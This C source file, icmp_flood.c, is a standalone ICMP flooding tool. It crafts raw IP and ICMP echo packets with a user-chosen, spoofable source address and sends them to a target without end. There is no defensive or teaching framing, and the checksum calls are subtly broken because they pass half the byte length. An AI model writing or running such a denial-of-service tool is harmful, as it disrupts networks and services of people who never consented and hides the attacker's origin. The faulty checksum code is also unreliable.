// icmp_flood.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <unistd.h>

struct packet {
    struct iphdr ip;
    struct icmphdr icmp;
    char payload[1400];
};

unsigned short checksum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len == 1) sum += *(unsigned char*)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Usage: %s <source_ip> <target_ip>\n", argv[0]);
        return 1;
    }

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("socket");
        return 1;
    }

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct packet pkt;
    memset(&pkt, 0, sizeof(pkt));

    // IP Header
    pkt.ip.version = 4;
    pkt.ip.ihl = 5;
    pkt.ip.tot_len = htons(sizeof(pkt));
    pkt.ip.ttl = 64;
    pkt.ip.protocol = IPPROTO_ICMP;
    pkt.ip.saddr = inet_addr(argv[1]);
    pkt.ip.daddr = inet_addr(argv[2]);

    // ICMP Header
    pkt.icmp.type = ICMP_ECHO;
    pkt.icmp.code = 0;

    memset(pkt.payload, 'A', sizeof(pkt.payload));

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(argv[2]);

    printf("ICMP Flooding %s...\n", argv[2]);

    unsigned long count = 0;
    while (1) {
        pkt.ip.id = htons(rand());
        pkt.icmp.un.echo.id = htons(rand());
        pkt.icmp.un.echo.sequence = htons(rand());
        
        pkt.ip.check = 0;
        pkt.ip.check = checksum((unsigned short*)&pkt.ip, sizeof(struct iphdr)/2);
        
        pkt.icmp.checksum = 0;
        pkt.icmp.checksum = checksum((unsigned short*)&pkt.icmp, 
                                     (sizeof(struct icmphdr) + sizeof(pkt.payload))/2);

        sendto(sock, &pkt, sizeof(pkt), 0, (struct sockaddr*)&dest, sizeof(dest));
        
        count++;
        if (count % 100000 == 0) {
            printf("\r[+] Sent: %lu packets", count);
            fflush(stdout);
        }
    }

    return 0;
}
